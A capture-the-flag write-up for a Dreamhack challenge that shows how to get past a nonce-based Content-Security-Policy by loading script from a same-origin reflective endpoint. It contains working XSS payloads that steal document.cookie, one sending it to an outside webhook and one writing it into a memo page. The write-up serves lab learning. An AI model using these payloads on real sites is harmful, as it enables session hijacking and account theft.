# CSP Bypass
This challenge involves bypassing CSP policy by inserting the payload into the web content itself

```
Content-Security-Policy: default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-94d11e742777c410a2b22e420ba1831b'
```
- default: only source from self is allowed
- img: from self and from dreamhack.io
- style: allow for unsafe-inline
- script: allow for nonce script

## Solve
First I try with this payload but obviously the webhook coudn't be reached cause of the CSP header
```
<script src=/vuln?param=location.href="http://njdjcj2p.requestrepo.com/?flag="%2bdocument.cookie></script>
```

Since the CSP header allow for script tag to be sourced from self, I'll craft a payload that instead of leaking flag to a webhook, write the flag into memo
```
<script src=/vuln?param=location.href="/memo?memo="%2Bdocument.cookie></script>
```
Note the `%2B` encoding for the `+` to avoid it being parsed to ' ' (space char)
This works because we are sourcing our script tag content from /vuln endpoint, what it returns is what our script content will be, which is:
```
location.href="/memo?memo="%2Bdocument.cookie
```
